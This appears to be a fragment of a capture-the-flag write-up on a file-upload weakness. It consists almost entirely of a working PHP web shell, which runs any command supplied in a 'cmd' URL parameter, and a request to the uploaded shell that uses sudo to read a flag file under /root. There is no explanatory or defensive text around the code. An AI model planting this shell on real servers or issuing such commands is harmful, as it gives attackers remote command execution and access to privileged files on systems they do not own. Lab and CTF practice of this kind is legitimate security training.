
File upload
```
<?php
function executeCommand($cmd) {
    exec($cmd, $output, $return_var);
    
    echo "<pre><b>Command:</b> " . htmlspecialchars($cmd) . "\n";
    echo "<b>Output:</b>\n" . implode("\n", array_map('htmlspecialchars', $output)) . "\n";
    echo "<b>Exit Code:</b> $return_var</pre>";
}

// Example usage (uncomment to test)
// executeCommand('ls /');

// Allow command input via GET (e.g., command.php?cmd=ls+/)
if (isset($_GET['cmd'])) {
    $user_cmd = $_GET['cmd'];
    executeCommand($user_cmd);
} else {
    echo "Usage: command.php?cmd=<command>";
}
?>
```
/uploads/exc.php?cmd=sudo+cat+/root/flag.txt

